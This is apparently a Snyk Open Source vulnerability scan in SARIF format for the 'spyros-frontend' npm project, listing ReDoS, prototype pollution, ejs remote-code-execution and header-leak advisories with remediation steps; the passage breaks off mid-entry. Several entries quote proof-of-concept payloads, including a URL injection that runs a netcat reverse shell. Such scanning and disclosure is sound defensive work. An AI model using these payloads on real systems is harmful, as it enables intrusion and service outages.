{
  "$schema": "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/master/Schemata/sarif-schema-2.1.0.json",
  "version": "2.1.0",
  "runs": [
    {
      "tool": {
        "driver": {
          "name": "Snyk Open Source",
          "rules": [
            {
              "id": "SNYK-JS-ANSIREGEX-1583908",
              "shortDescription": {
                "text": "High severity - Regular Expression Denial of Service (ReDoS) vulnerability in ansi-regex"
              },
              "fullDescription": {
                "text": "(CVE-2021-3807) ansi-regex@2.1.1"
              },
              "help": {
                "text": "",
                "markdown": "* Package Manager: yarn\n* Vulnerable module: ansi-regex\n* Introduced through: spyros-frontend@1.0.0, react-d3-library@1.1.8 and others\n### Detailed paths\n* _Introduced through_: spyros-frontend@1.0.0 › react-d3-library@1.1.8 › babel-core@6.26.3 › babel-code-frame@6.26.0 › chalk@1.1.3 › strip-ansi@3.0.1 › ansi-regex@2.1.1\n* _Introduced through_: spyros-frontend@1.0.0 › react-d3-library@1.1.8 › babel-core@6.26.3 › babel-code-frame@6.26.0 › chalk@1.1.3 › has-ansi@2.0.0 › ansi-regex@2.1.1\n* _Introduced through_: spyros-frontend@1.0.0 › npm@7.16.0 › @npmcli/arborist@2.6.2 › @npmcli/metavuln-calculator@1.1.1 › pacote@11.3.4 › @npmcli/run-script@1.8.5 › node-gyp@7.1.2 › npmlog@4.1.2 › gauge@2.7.4 › string-width@1.0.2 › strip-ansi@3.0.1 › ansi-regex@2.1.1\n* _Introduced through_: spyros-frontend@1.0.0 › npm@7.16.0 › @npmcli/arborist@2.6.2 › @npmcli/metavuln-calculator@1.1.1 › pacote@11.3.4 › @npmcli/run-script@1.8.5 › node-gyp@7.1.2 › npmlog@4.1.2 › gauge@2.7.4 › wide-align@1.1.3 › string-width@2.1.1 › strip-ansi@4.0.0 › ansi-regex@3.0.0\n* _Introduced through_: spyros-frontend@1.0.0 › npm@7.16.0 › cli-table3@0.6.0 › string-width@4.2.2 › strip-ansi@6.0.0 › ansi-regex@5.0.0\n* _Introduced through_: spyros-frontend@1.0.0 › react-scripts@5.0.0 › jest@27.4.7 › @jest/core@27.4.7 › @jest/reporters@27.4.6 › string-length@4.0.2 › strip-ansi@6.0.0 › ansi-regex@5.0.0\n# Overview\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) due to the sub-patterns` [[\\\\]()#;?]*` and `(?:;[-a-zA-Z\\\\d\\\\/#&.:=?%@~_]*)*`.\r\n\r\n\r\n## PoC\r\n```js\r\nimport ansiRegex from 'ansi-regex';\r\n\r\nfor(var i = 1; i <= 50000; i++) {\r\n    var time = Date.now();\r\n    var attack_str = \"\\u001B[\"+\";\".repeat(i*10000);\r\n    ansiRegex().test(attack_str)\r\n    var time_cost = Date.now() - time;\r\n    console.log(\"attack_str.length: \" + attack_str.length + \": \" + time_cost+\" ms\")\r\n}\r\n```\n\n# Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n# Remediation\nUpgrade `ansi-regex` to version 3.0.1, 4.1.1, 5.0.1, 6.0.1 or higher.\n# References\n- [GitHub Commit](https://github.com/chalk/ansi-regex/commit/419250fa510bf31b4cc672e76537a64f9332e1f1)\n- [GitHub Commit](https://github.com/chalk/ansi-regex/commit/75a657da7af875b2e2724fd6331bf0a4b23d3c9a)\n- [GitHub Commit](https://github.com/chalk/ansi-regex/commit/8d1d7cdb586269882c4bdc1b7325d0c58c8f76f9)\n- [GitHub PR](https://github.com/chalk/ansi-regex/pull/37)\n"
              },
              "properties": {
                "tags": [
                  "security",
                  "CWE-400",
                  "yarn"
                ]
              }
            },
            {
              "id": "SNYK-JS-ASYNC-2441827",
              "shortDescription": {
                "text": "High severity - Prototype Pollution vulnerability in async"
              },
              "fullDescription": {
                "text": "(CVE-2021-43138) async@2.6.3"
              },
              "help": {
                "text": "",
                "markdown": "* Package Manager: yarn\n* Vulnerable module: async\n* Introduced through: spyros-frontend@1.0.0, react-scripts@5.0.0 and others\n### Detailed paths\n* _Introduced through_: spyros-frontend@1.0.0 › react-scripts@5.0.0 › webpack-dev-server@4.7.3 › portfinder@1.0.28 › async@2.6.3\n# Overview\n\nAffected versions of this package are vulnerable to Prototype Pollution via the `mapValues()` method, due to improper check in `createObjectIterator` function.\r\n\r\n# PoC\r\n\r\n```js\r\n//when objects are parsed, all properties are created as own (the objects can come from outside sources (http requests/ file))\r\nconst hasOwn = JSON.parse('{\"__proto__\": {\"isAdmin\": true}}');\r\n\r\n//does not have the property,  because it's inside object's own \"__proto__\"\r\nconsole.log(hasOwn.isAdmin);\r\n\r\nasync.mapValues(hasOwn, (val, key, cb) => cb(null, val), (error, result) => {\r\n  // after the method executes, hasOwn.__proto__ value (isAdmin: true) replaces the prototype of the newly created object, leading to potential exploits.\r\n  console.log(result.isAdmin);\r\n});\r\n```\n\n# Details\n\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `_proto_`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\n\nThere are two main ways in which the pollution of prototypes occurs:\n\n-   Unsafe `Object` recursive merge\n    \n-   Property definition by path\n    \n\n## Unsafe Object recursive merge\n\nThe logic of a vulnerable recursive merge function follows the following high-level model:\n```\nmerge (target, source)\n\n  foreach property of source\n\n    if property exists and is an object on both the target and the source\n\n      merge(target[property], source[property])\n\n    else\n\n      target[property] = source[property]\n```\n<br>  \n\nWhen the source object contains a property named `_proto_` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\n\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\n\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\n\n## Property definition by path\n\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\n\nIf the attacker can control the value of “path”, they can set this value to `_proto_.myValue`. `myValue` is then assigned to the prototype of the class of the object.\n\n# Types of attacks\n\nThere are a few methods by which Prototype Pollution can be manipulated:\n\n| Type |Origin  |Short description |\n|--|--|--|\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\n\n# Affected environments\n\nThe following environments are susceptible to a Prototype Pollution attack:\n\n-   Application server\n    \n-   Web server\n    \n\n# How to prevent\n\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\n    \n2.  Require schema validation of JSON input.\n    \n3.  Avoid using unsafe recursive merge functions.\n    \n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\n    \n5.  As a best practice use `Map` instead of `Object`.\n\n## For more information on this vulnerability type:\n\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n\n# Remediation\nUpgrade `async` to version 2.6.4, 3.2.2 or higher.\n# References\n- [GitHub Backport PR](https://github.com/caolan/async/pull/1828)\n- [GitHub Commit](https://github.com/caolan/async/commit/8f7f90342a6571ba1c197d747ebed30c368096d2)\n- [GitHub Commit](https://github.com/caolan/async/commit/e1ecdbf79264f9ab488c7799f4c76996d5dca66d)\n- [PoC](https://jsfiddle.net/oz5twjd9/)\n"
              },
              "properties": {
                "tags": [
                  "security",
                  "CWE-1321",
                  "yarn"
                ]
              }
            },
            {
              "id": "SNYK-JS-CSSWHAT-1298035",
              "shortDescription": {
                "text": "Medium severity - Regular Expression Denial of Service (ReDoS) vulnerability in css-what"
              },
              "fullDescription": {
                "text": "(CVE-2021-33587) css-what@3.4.2"
              },
              "help": {
                "text": "",
                "markdown": "* Package Manager: yarn\n* Vulnerable module: css-what\n* Introduced through: spyros-frontend@1.0.0, react-scripts@5.0.0 and others\n### Detailed paths\n* _Introduced through_: spyros-frontend@1.0.0 › react-scripts@5.0.0 › @svgr/webpack@5.5.0 › @svgr/plugin-svgo@5.5.0 › svgo@1.3.2 › css-select@2.1.0 › css-what@3.4.2\n# Overview\n[css-what](https://www.npmjs.org/package/css-what) is an a CSS selector parser\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via attribute parsing.\n\n# Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n# Remediation\nUpgrade `css-what` to version 5.0.1 or higher.\n# References\n- [GitHub Commit](https://github.com/fb55/css-what/commit/4cdaacfd0d4b6fd00614be030da0dea6c2994655)\n- [GitHub PR](https://github.com/fb55/css-what/pull/503)\n- [GitHub Release](https://github.com/fb55/css-what/releases/tag/v5.0.1)\n"
              },
              "properties": {
                "tags": [
                  "security",
                  "CWE-400",
                  "yarn"
                ]
              }
            },
            {
              "id": "SNYK-JS-D3COLOR-1076592",
              "shortDescription": {
                "text": "Medium severity - Regular Expression Denial of Service (ReDoS) vulnerability in d3-color"
              },
              "fullDescription": {
                "text": "d3-color@3.0.1"
              },
              "help": {
                "text": "",
                "markdown": "* Package Manager: yarn\n* Vulnerable module: d3-color\n* Introduced through: spyros-frontend@1.0.0, react-flow-renderer@9.7.4 and others\n### Detailed paths\n* _Introduced through_: spyros-frontend@1.0.0 › react-flow-renderer@9.7.4 › d3-zoom@3.0.0 › d3-interpolate@3.0.1 › d3-color@3.0.1\n* _Introduced through_: spyros-frontend@1.0.0 › react-flow-renderer@9.7.4 › d3-zoom@3.0.0 › d3-transition@3.0.1 › d3-color@3.0.1\n* _Introduced through_: spyros-frontend@1.0.0 › react-force-graph-2d@1.23.6 › force-graph@1.41.1 › d3-scale-chromatic@2.0.0 › d3-color@2.0.0\n* _Introduced through_: spyros-frontend@1.0.0 › react-force-graph-2d@1.23.6 › force-graph@1.41.1 › d3-scale@3.3.0 › d3-interpolate@2.0.1 › d3-color@2.0.0\n* _Introduced through_: spyros-frontend@1.0.0 › react-force-graph-2d@1.23.6 › force-graph@1.41.1 › d3-zoom@2.0.0 › d3-transition@2.0.0 › d3-color@2.0.0\n# Overview\n[d3-color](https://www.npmjs.org/package/d3-color) is a Color spaces! RGB, HSL, Cubehelix, Lab and HCL (Lch).\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `rgb()` and `hrc()` functions. \r\n\r\nPoC by Yeting Li: \r\n```\r\nvar d3Color = require(\"d3-color\")\r\n// d3Color.rgb(\"rgb(255,255,255)\")\r\n\r\nfunction build_blank(n) {\r\n    var ret = \"rgb(\"\r\n    for (var i = 0; i < n; i++) {\r\n        ret += \"1\"\r\n    }\r\n    return ret + \"!\";\r\n}\r\n\r\nfor(var i = 1; i <= 5000000; i++) {\r\n    if (i % 1000 == 0) {\r\n        var time = Date.now();\r\n        var attack_str = build_blank(i)\r\n        d3Color.rgb(attack_str)\r\n        var time_cost = Date.now() - time;\r\n        console.log(\"attack_str.length: \" + attack_str.length + \": \" + time_cost+\" ms\")\r\n    }\r\n}\r\n```\n\n# Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n# Remediation\nUpgrade `d3-color` to version 3.1.0 or higher.\n# References\n- [Github PR](https://github.com/d3/d3-color/pull/100)\n- [Github PR](https://github.com/d3/d3-color/pull/99)\n- [GitHub PR](https://github.com/d3/d3-color/pull/89)\n- [Github Releases](https://github.com/d3/d3-color/releases/tag/v3.1.0)\n"
              },
              "properties": {
                "tags": [
                  "security",
                  "CWE-400",
                  "yarn"
                ]
              }
            },
            {
              "id": "SNYK-JS-EJS-2803307",
              "shortDescription": {
                "text": "High severity - Remote Code Execution (RCE) vulnerability in ejs"
              },
              "fullDescription": {
                "text": "(CVE-2022-29078) ejs@3.1.6"
              },
              "help": {
                "text": "",
                "markdown": "* Package Manager: yarn\n* Vulnerable module: ejs\n* Introduced through: spyros-frontend@1.0.0, react-scripts@5.0.0 and others\n### Detailed paths\n* _Introduced through_: spyros-frontend@1.0.0 › react-scripts@5.0.0 › workbox-webpack-plugin@6.4.2 › workbox-build@6.4.2 › @surma/rollup-plugin-off-main-thread@2.2.3 › ejs@3.1.6\n# Overview\n[ejs](https://www.npmjs.com/package/ejs) is a popular JavaScript templating engine.\n\nAffected versions of this package are vulnerable to Remote Code Execution (RCE) by passing an unrestricted render option via the `view options` parameter of `renderFile`, which makes it possible to inject code into `outputFunctionName`.\r\n\r\n\r\n**Note:**\r\nThis vulnerability is exploitable only if the server is already vulnerable to Prototype Pollution.\r\n\r\n# PoC:\r\nCreation of reverse shell:\r\n```\r\nhttp://localhost:3000/page?id=2&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('nc -e sh 127.0.0.1 1337');s\r\n```\n# Remediation\nUpgrade `ejs` to version 3.1.7 or higher.\n# References\n- [GitHub Commit](https://github.com/mde/ejs/commit/15ee698583c98dadc456639d6245580d17a24baf)\n- [GitHub Issue](https://github.com/mde/ejs/issues/451)\n- [GitHub Release](https://github.com/mde/ejs/releases)\n- [Security Advisory](https://eslam.io/posts/ejs-server-side-template-injection-rce/)\n"
              },
              "properties": {
                "tags": [
                  "security",
                  "CWE-94",
                  "yarn"
                ]
              }
            },
            {
              "id": "SNYK-JS-FOLLOWREDIRECTS-2396346",
              "shortDescription": {
                "text": "Low severity - Information Exposure vulnerability in follow-redirects"
              },
              "fullDescription": {
                "text": "(CVE-2022-0536) follow-redirects@1.14.7"
              },
              "help": {
                "text": "",
                "markdown": "* Package Manager: yarn\n* Vulnerable module: follow-redirects\n* Introduced through: spyros-frontend@1.0.0, axios@0.21.4 and others\n### Detailed paths\n* _Introduced through_: spyros-frontend@1.0.0 › axios@0.21.4 › follow-redirects@1.14.7\n* _Introduced through_: spyros-frontend@1.0.0 › react-scripts@5.0.0 › webpack-dev-server@4.7.3 › http-proxy-middleware@2.0.1 › http-proxy@1.18.1 › follow-redirects@1.14.7\n* _Introduced through_: spyros-frontend@1.0.0 › jest-puppeteer@6.0.3 › jest-environment-puppeteer@6.0.3 › jest-dev-server@6.0.3 › wait-on@6.0.0 › axios@0.21.4 › follow-redirects@1.14.7\n# Overview\n\nAffected versions of this package are vulnerable to Information Exposure due a leakage of the Authorization header from the same hostname during HTTPS to HTTP redirection. An attacker who can listen in on the wire (or perform a MITM attack) will be able to receive the Authorization header due to the usage of the insecure HTTP protocol which does not verify the hostname the request is sending to.\n# Remediation\nUpgrade `follow-redirects` to version 1.14.8 or higher.\n# References\n- [GitHub Commit](https://github.com/follow-redirects/follow-redirects/commit/62e546a99c07c3ee5e4e0718c84a6ca127c5c445)\n"
              },
              "properties": {
                "tags": [
                  "security",
                  "CWE-200",
                  "yarn"
                ]
              }
            },
            {
              "id": "SNYK-JS-GLOBPARENT-1016905",
              "shortDescription": {
                "text": "Medium severity - Regular Expression Denial of Service (ReDoS) vulnerability in glob-parent"
              },
              "fullDescription": {
                "text": "(CVE-2020-28469) glob-parent@2.0.0"
              },
              "help": {
                "text": "",
                "markdown": "* Package Manager: yarn\n* Vulnerable module: glob-parent\n* Introduced through: spyros-frontend@1.0.0, react-d3-library@1.1.8 and others\n### Detailed paths\n* _Introduced through_: spyros-frontend@1.0.0 › react-d3-library@1.1.8 › webpack@1.15.0 › watchpack@0.2.9 › chokidar@1.7.0 › glob-parent@2.0.0\n* _Introduced through_: spyros-frontend@1.0.0 › react-d3-library@1.1.8 › webpack@1.15.0 › watchpack@0.2.9 › chokidar@1.7.0 › anymatch@1.3.2 › micromatch@2.3.11 › parse-glob@3.0.4 › glob-base@0.3.0 › glob-parent@2.0.0\n# Overview\n[glob-parent](https://www.npmjs.com/package/glob-parent) is a package that helps extracting the non-magic parent path from a glob string.\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS). The `enclosure` regex used to check for strings ending in enclosure containing path separator.\r\n\r\n## PoC by Yeting Li\r\n```\r\nvar globParent = require(\"glob-parent\")\r\nfunction build_attack(n) {\r\nvar ret = \"{\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \"/\"\r\n}\r\n\r\nreturn ret;\r\n}\r\n\r\nglobParent(build_attack(5000));\r\n```\n\n# Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n# Remediation\nUpgrade `glob-parent` to version 5.1.2 or higher.\n# References\n- [GitHub PR](https://github.com/gulpjs/glob-parent/pull/36)\n- [GitHub Release](https://github.com/gulpjs/glob-parent/releases/tag/v5.1.2)\n"
              },
              "properties": {
                "tags": [
                  "security",
                  "CWE-400",
                  "yarn"
                ]
              }
            },
            {
              "id": "SNYK-JS-JSONSCHEMA-1920922",
              "shortDescription": {
                "text": "High severity - Prototype Pollution vulnerability in json-schema"
              },
              "fullDescription": {
                "text": "(CVE-2021-3918) json-schema@0.2.3"
              },
              "help": {
                "text": "",
                "markdown": "* Package Manager: yarn\n* Vulnerable module: json-schema\n* Introduced through: spyros-frontend@1.0.0, npm@7.16.0 and others\n### Detailed paths\n* _Introduced through_: spyros-frontend@1.0.0 › npm@7.16.0 › @npmcli/arborist@2.6.2 › @npmcli/metavuln-calculator@1.1.1 › pacote@11.3.4 › @npmcli/run-script@1.8.5 › node-gyp@7.1.2 › request@2.88.2 › http-signature@1.2.0 › jsprim@1.4.1 › json-schema@0.2.3\n# Overview\n\nAffected versions of this package are vulnerable to Prototype Pollution via the `validate` function, which when given a special payload will pollute `Object` with undesired attributes.\n\n# Details\n\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `_proto_`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript 